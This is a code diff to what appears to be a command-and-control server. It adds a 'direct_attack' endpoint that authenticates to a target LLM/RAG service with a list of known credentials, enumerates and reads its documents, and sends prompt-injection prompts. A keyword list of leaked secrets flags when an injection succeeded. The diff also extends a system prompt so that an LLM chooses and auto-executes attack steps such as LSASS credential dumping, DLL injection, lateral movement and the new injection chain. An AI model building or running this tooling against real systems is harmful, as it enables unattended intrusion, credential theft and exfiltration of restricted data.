@@ -14,7 +14,8 @@ import sys
 import re
 import logging.handlers
 from datetime import datetime, timedelta
-from ai_hunter import generate_ai_hunter_payload, AIHunterPayloadGenerator
+from ai_hunter import (generate_ai_hunter_payload, AIHunterPayloadGenerator,
+                        STRATEGY_PROMPTS, LAB_TARGET, get_strategy_prompts)
 from flask_jwt_extended import JWTManager, jwt_required, create_access_token, get_jwt_identity
 
 # Import CrowdStrike AI client
@@ -2694,6 +2695,151 @@ def ai_hunter_get_config():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
+@app.route('/ai_hunter/direct_attack', methods=['POST'])
+def ai_hunter_direct_attack():
+    """
+    Direct HTTP attack against a target LLM/RAG application.
+    Runs entirely from the C2 server (no agent needed).
+
+    Performs the full chain:
+      1. Verify the target is reachable (/health)
+      2. Authenticate as every known user
+      3. Enumerate accessible documents per user
+      4. Send injection prompts via /api/chat
+    Returns structured results matching the AI Hunter result schema.
+    """
+    try:
+        import requests as _req
+
+        data = request.json or {}
+        target_url = (data.get("target_url") or "http://localhost:8080").rstrip("/")
+        strategy = data.get("strategy", "data_exfil")
+        custom_creds = data.get("credentials")
+        custom_prompts = data.get("prompts")
+
+        creds = custom_creds or LAB_TARGET["credentials"]
+        prompts = custom_prompts or get_strategy_prompts(strategy)
+
+        report = {
+            "target_url": target_url,
+            "strategy": strategy,
+            "endpoints": [],
+            "sessions": [],
+            "docs": [],
+            "llm_responses": [],
+            "errors": [],
+        }
+
+        # ── Step 1: health check ──────────────────────────────────
+        try:
+            h = _req.get(f"{target_url}/health", timeout=5)
+            if h.status_code == 200:
+                health_data = h.json()
+                report["endpoints"].append({
+                    "url": target_url,
+                    "type": "rag_api",
+                    "model": health_data.get("model"),
+                    "lab_id": health_data.get("lab_id"),
+                    "llm_status": health_data.get("status"),
+                })
+            else:
+                return jsonify({"status": "error", "message": f"Target returned HTTP {h.status_code}"}), 400
+        except Exception as e:
+            return jsonify({"status": "error", "message": f"Cannot reach target: {e}"}), 400
+
+        # ── Step 2: authenticate + enumerate per user ─────────────
+        for cred in creds:
+            try:
+                auth_resp = _req.post(
+                    f"{target_url}/auth/login",
+                    json=cred,
+                    timeout=5,
+                )
+                if auth_resp.status_code != 200:
+                    report["errors"].append(f"Auth failed for {cred['username']}: HTTP {auth_resp.status_code}")
+                    continue
+
+                token_data = auth_resp.json()
+                token = token_data.get("access_token")
+                user_info = token_data.get("user", {})
+                if not token:
+                    continue
+
+                headers = {"Authorization": f"Bearer {token}"}
+                report["sessions"].append({
+                    "username": cred["username"],
+                    "role": user_info.get("role"),
+                    "scopes": user_info.get("scopes", []),
+                    "token_prefix": token[:20] + "…",
+                })
+
+                # Document enumeration
+                try:
+                    docs_resp = _req.get(f"{target_url}/docs", headers=headers, timeout=5)
+                    if docs_resp.status_code == 200:
+                        for doc_meta in docs_resp.json():
+                            doc_id = doc_meta.get("id")
+                            try:
+                                doc_resp = _req.get(f"{target_url}/docs/{doc_id}", headers=headers, timeout=5)
+                                if doc_resp.status_code == 200:
+                                    content = doc_resp.json().get("content", "")
+                                    report["docs"].append({
+                                        "id": doc_id,
+                                        "classification": doc_meta.get("classification"),
+                                        "user": cred["username"],
+                                        "content_preview": content[:400],
+                                        "access": "granted",
+                                    })
+                                else:
+                                    report["docs"].append({
+                                        "id": doc_id,
+                                        "classification": doc_meta.get("classification"),
+                                        "user": cred["username"],
+                                        "access": "denied",
+                                        "error": f"HTTP {doc_resp.status_code}",
+                                    })
+                            except Exception as de:
+                                report["docs"].append({"id": doc_id, "user": cred["username"], "access": "error", "error": str(de)})
+                except Exception as de:
+                    report["errors"].append(f"Doc listing failed for {cred['username']}: {de}")
+
+                # LLM prompt injection
+                for prompt in prompts:
+                    try:
+                        chat_resp = _req.post(
+                            f"{target_url}/api/chat",
+                            json={"message": prompt},
+                            headers=headers,
+                            timeout=60,
+                        )
+                        if chat_resp.status_code == 200:
+                            reply = chat_resp.json().get("reply", "")
+                            # Heuristic: flag if response looks like it leaked restricted data
+                            leaked = any(kw in reply.lower() for kw in [
+                                "db_pass", "secret", "aws_access_key", "stripe_secret",
+                                "sk_live", "salesforce", "akia", "supersecrethey",
+                                "production-credentials", "db_user=", "poisoned"
+                            ])
+                            report["llm_responses"].append({
+                                "user": cred["username"],
+                                "role": user_info.get("role"),
+                                "prompt": prompt,
+                                "reply": reply[:1500],
+                                "injection_succeeded": leaked,
+                            })
+                    except Exception as ce:
+                        report["errors"].append(f"Chat failed for {cred['username']}: {ce}")
+
+            except Exception as e:
+                report["errors"].append(f"Exception for {cred.get('username','?')}: {e}")
+
+        return jsonify({"status": "success", "report": report})
+
+    except Exception as e:
+        logger.error(f"AI Hunter direct attack error: {traceback.format_exc()}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
 # ========== AUTORECON ==========
 
 def _autorecon_deploy_next_step(session_id):
@@ -2866,6 +3012,8 @@ def autorecon_status(session_id):
                 "completion_reason": session.get("completion_reason"),
                 "error": session.get("error"),
                 "steps": session["steps"],
+                "ai_hunter_target": session.get("ai_hunter_target"),
+                "ai_hunter_credentials": session.get("ai_hunter_credentials"),
             },
         })
 
@@ -2911,17 +3059,23 @@ Your task:
    - Cloud artifacts: AWS access keys, Azure tokens, GCP service account keys, metadata endpoints
    - Privilege escalation: writable service paths, unquoted service paths, AlwaysInstallElevated, weak ACLs
    - Lateral movement: discovered hosts reachable via SSH/WMI/PSExec
+   - LLM/AI services: any Flask API with /health, /api/chat, /auth/login endpoints — especially RAG applications,
+     Ollama instances, or LLM chatbots exposed on common ports (11434, 8080, 5000, 8000, 1234, 3000).
+     These are high-value targets for prompt injection attacks.
 
 2. For each finding suggest ONE specific follow-up action from this exact list:
-   - "lsass"  → dump LSASS memory to extract more credentials (use when: NTLM hash, SAM db, credential store found)
-   - "lateral" → SSH/WMI lateral movement to a discovered host (use when: remote host IPs + any credentials found)
-   - "cloud"  → enumerate cloud environment (use when: AWS/Azure/GCP keys, metadata URL, cloud token found)
-   - "dll"    → DLL injection / persistence (use when: writable system path, service hijack opportunity, privesc path found)
-   - "recon"  → extended recon on a newly discovered subnet or host (use when: new IPs / subnets discovered)
+   - "lsass"     → dump LSASS memory (use when: NTLM hash, SAM db, credential store found)
+   - "lateral"   → SSH/WMI lateral movement (use when: remote host IPs + credentials found)
+   - "cloud"     → enumerate cloud environment (use when: AWS/Azure/GCP keys or metadata URL found)
+   - "dll"       → DLL injection / persistence (use when: writable system path or privesc found)
+   - "recon"     → extended recon on new subnet or host (use when: new IPs/subnets discovered)
+   - "ai_hunter" → LLM prompt injection attack chain (use when: an LLM/RAG/AI API service is found —
+                    include the discovered URL as the "target_url" field in the action,
+                    and include any discovered credentials as "credentials")
 
 Rules:
 - Only suggest actions directly justified by the findings.
-- Set auto_execute=true ONLY when the finding is clear and unambiguous (e.g., actual hash value extracted, actual IP + credential pair found).
+- Set auto_execute=true ONLY when the finding is clear and unambiguous.
 - Set auto_execute=false when the suggestion is speculative.
 - Do NOT invent data that is not in the output.
 
@@ -2929,15 +3083,15 @@ Respond with ONLY valid JSON in this exact schema (no markdown, no explanation):
 {{
   "summary": "<one-sentence summary of key findings>",
   "findings": [
-    {{"type": "credential|network|cloud|privesc|other", "description": "<what was found>", "value": "<the actual value/IP/path>", "severity": "critical|high|medium|low"}}
+    {{"type": "credential|network|cloud|privesc|llm_service|other", "description": "<what was found>", "value": "<the actual value/IP/path/URL>", "severity": "critical|high|medium|low"}}
   ],
   "suggested_actions": [
-    {{"action_type": "lsass|lateral|cloud|dll|recon", "reason": "<why this action is warranted>", "auto_execute": true|false, "priority": 1}}
+    {{"action_type": "lsass|lateral|cloud|dll|recon|ai_hunter", "reason": "<why this action is warranted>", "auto_execute": true|false, "priority": 1, "target_url": "<optional: URL for ai_hunter>", "credentials": []}}
   ]
 }}"""
 
         if not CROWDSTRIKE_WORKFLOW_ID or not crowdstrike_config:
-            # Fallback: simple keyword-based analysis
+            # Fallback: keyword-based analysis with LLM service detection
             result_text = str(step["result"]).lower()
             findings = []
             suggested_actions = []
@@ -2953,6 +3107,28 @@ Respond with ONLY valid JSON in this exact schema (no markdown, no explanation):
             if any(k in result_text for k in ["aws", "azure", "gcp", "s3", "access_key", "metadata"]):
                 findings.append({"type": "cloud", "description": "Cloud artifacts detected", "value": "see raw results", "severity": "high"})
                 suggested_actions.append({"action_type": "cloud", "reason": "Cloud credentials or metadata endpoint found", "auto_execute": False, "priority": 1})
+
+            # LLM/AI service detection
+            llm_url = None
+            import re as _re
+            # Look for URLs with common LLM ports
+            for pattern in [r'http://[\w.]+:(?:8080|5000|11434|8000|1234|3000)', r'localhost:(?:8080|5000|11434|8000)']:
+                m = _re.search(pattern, str(step["result"]))
+                if m:
+                    llm_url = m.group()
+                    break
+            llm_keywords = ["ollama", "/api/chat", "/health", "llm", "rag", "ai_assistant", "corpaai", "ai security lab", "flask", "neural nexus skill"]
+            if any(k in result_text for k in llm_keywords) or llm_url:
+                url_val = llm_url or "http://localhost:8080"
+                findings.append({"type": "llm_service", "description": "LLM/RAG AI service detected — potential prompt injection target", "value": url_val, "severity": "critical"})
+                suggested_actions.append({
+                    "action_type": "ai_hunter",
+                    "reason": "AI/LLM service found — launch prompt injection attack chain to extract documents beyond authorized scope",
+                    "auto_execute": True,
+                    "priority": 1,
+                    "target_url": url_val,
+                    "credentials": LAB_TARGET["credentials"]
+                })
 
             analysis = {
                 "summary": f"Keyword-based analysis of step {step_num} results (AI not configured)",
@@ -2986,7 +3162,7 @@ Respond with ONLY valid JSON in this exact schema (no markdown, no explanation):
 
         # Auto-execute high-confidence suggested actions
         executed_tasks = []
-        ALLOWED_AUTO_TYPES = {"lsass", "lateral", "cloud", "dll", "recon"}
+        ALLOWED_AUTO_TYPES = {"lsass", "lateral", "cloud", "dll", "recon", "ai_hunter"}
 
         if auto_execute:
             # Sort by priority
@@ -2999,24 +3175,51 @@ Respond with ONLY valid JSON in this exact schema (no markdown, no explanation):
                     continue
 
                 try:
-                    code = generate_code(action_type, {"triggered_by": "autorecon", "step": step_num})
-                    task_id = str(uuid.uuid4())
-                    tasks[task_id] = {
-                        "id": task_id,
-                        "agent_id": session["agent_id"],
-                        "task_type": action_type,
-                        "code": code,
-                        "status": "pending",
-                        "created_at": datetime.now().isoformat(),
-                        "autorecon_triggered": True,
-                        "autorecon_session_id": session_id,
-                        "trigger_step": step_num,
-                        "trigger_reason": action.get("reason", ""),
-                    }
+                    if action_type == "ai_hunter":
+                        # Special handling: record as an ai_hunter task with target metadata
+                        target_url = action.get("target_url", "http://localhost:8080")
+                        creds = action.get("credentials", LAB_TARGET["credentials"])
+                        task_id = str(uuid.uuid4())
+                        tasks[task_id] = {
+                            "id": task_id,
+                            "agent_id": session["agent_id"],
+                            "task_type": "ai_hunter",
+                            "code": f"# AI Hunter auto-triggered by AutoRecon\n# Target: {target_url}",
+                            "status": "pending",
+                            "created_at": datetime.now().isoformat(),
+                            "autorecon_triggered": True,
+                            "autorecon_session_id": session_id,
+                            "trigger_step": step_num,
+                            "trigger_reason": action.get("reason", ""),
+                            "ai_hunter_config": {
+                                "target_url": target_url,
+                                "strategy": "data_exfil",
+                                "credentials": creds,
+                            },
+                        }
+                        # Store AI Hunter target in the session for the UI to pick up
+                        session["ai_hunter_target"] = target_url
+                        session["ai_hunter_credentials"] = creds
+                    else:
+                        code = generate_code(action_type, {"triggered_by": "autorecon", "step": step_num})
+                        task_id = str(uuid.uuid4())
+                        tasks[task_id] = {
+                            "id": task_id,
+                            "agent_id": session["agent_id"],
+                            "task_type": action_type,
+                            "code": code,
+                            "status": "pending",
+                            "created_at": datetime.now().isoformat(),
+                            "autorecon_triggered": True,
+                            "autorecon_session_id": session_id,
+                            "trigger_step": step_num,
+                            "trigger_reason": action.get("reason", ""),
+                        }
                     executed_tasks.append({
                         "task_id": task_id,
                         "task_type": action_type,
                         "reason": action.get("reason", ""),
+                        "target_url": action.get("target_url"),
                     })
                     logger.info(
                         f"AutoRecon auto-executed '{action_type}' task {task_id} "
